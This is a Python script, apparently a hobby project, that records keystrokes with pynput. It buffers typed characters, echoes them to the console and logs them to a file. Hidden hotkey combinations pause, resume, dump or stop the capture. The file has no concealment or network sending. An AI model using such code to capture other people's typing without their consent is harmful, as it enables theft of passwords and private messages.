from util import utilities
from logger import logger
from pynput import keyboard
from pynput.keyboard import Key, Listener, KeyCode, Controller
from countdown import Countdown
from decorators.decorators import catch_exception

S_code = 83
P_code = 80
D_code = 68
T_code = 84

is_ctrl_pressed:bool = False
is_alt_pressed:bool = False
is_shift_pressed:bool = False
should_register:bool = True
is_idle:bool = True
key_buffer:list[str] = list()
buffer_capacity:int = 15
elements_to_preserve:int = 3

lang_change_listener:Listener
_keyboard = Controller()


@catch_exception(print_trace=True)
def on_pressed(key):
    global key_buffer, is_alt_pressed, is_shift_pressed, is_ctrl_pressed, is_idle
    if isinstance(key, KeyCode):
        if is_ctrl_pressed or is_alt_pressed:
            __check_for_special_handling(ord(key.char))
        else:
            is_idle = False
            if should_register:
                print(key.char)
                key_buffer.append(key.char)
    else:
        if __check_for_combination_key(key):
            return

        if should_register:
            if key == Key.space:
                is_idle = False
                print(" ")
                key_buffer.append(" ")
            elif key == Key.backspace:
                if len(key_buffer) > 0:
                    del key_buffer[-1]
            elif key == Key.enter:
                is_idle = False
                print("\n")
                key_buffer.append("\n")

    if len(key_buffer) == buffer_capacity:
        __log_buffer()


def on_release(key):
    if key == Key.ctrl_l:
        global is_ctrl_pressed
        is_ctrl_pressed = False
    elif key == Key.alt_l:
        global is_alt_pressed
        is_alt_pressed = False
    elif key == Key.shift_l:
        global is_shift_pressed
        is_shift_pressed = False


def __check_for_combination_key(key) -> bool:
    global is_ctrl_pressed, is_alt_pressed, is_shift_pressed

    if key == Key.ctrl_l:
        is_ctrl_pressed = True
        return True
    elif key == Key.alt_l:
        is_alt_pressed = True
        return True
    elif key == Key.shift_l:
        is_shift_pressed = True
        return True

    return False


def __check_for_special_handling(unicode):
    if is_alt_pressed and is_shift_pressed and is_ctrl_pressed:
        global should_register,key_buffer

        if   unicode == P_code:     #stop recording and timers
            should_register = False
        elif unicode == S_code:     #start recording and timers again
            should_register = True
        elif unicode == D_code:     #force dump contents of array in file
            __log_buffer(is_dump=True)
        elif unicode == T_code:     #wait for logging to complete if ongoing, and exit
            __exit_safely()


def __log_buffer(is_dump:bool=False):
    global key_buffer, elements_to_preserve
    if is_dump:
        logger.log_to_file(buffer=key_buffer, is_dump=is_dump)
        key_buffer = list()
    else:
        new_buffer = key_buffer[len(key_buffer)-elements_to_preserve:]
        logger.log_to_file(buffer=key_buffer,elements_to_skip=elements_to_preserve)
        key_buffer = new_buffer


def __check_for_new_characters():
    global is_idle

    if not is_idle or len(key_buffer) == 0:
        is_idle = True
        return

    __log_buffer(is_dump=True)


def __exit_safely():
    __shutdown_executors()
    logger.queue_callback(__exit_immediately)


def __exit_immediately(*args):
    exit(0)






def __init_executors():
    logger.init()
    # Countdown.make_and_start("idle checker", 3, __check_for_new_characters)
    # Countdown.make_and_start("two", 1, lambda : print("TWO callback"))


def __shutdown_executors():
    logger.shutdown()
    Countdown.stop_all()


# ________________________________________ START _________________________________________________


__init_executors()

with keyboard.Listener(on_press=on_pressed, on_release=on_release) as listener:
    listener.join()

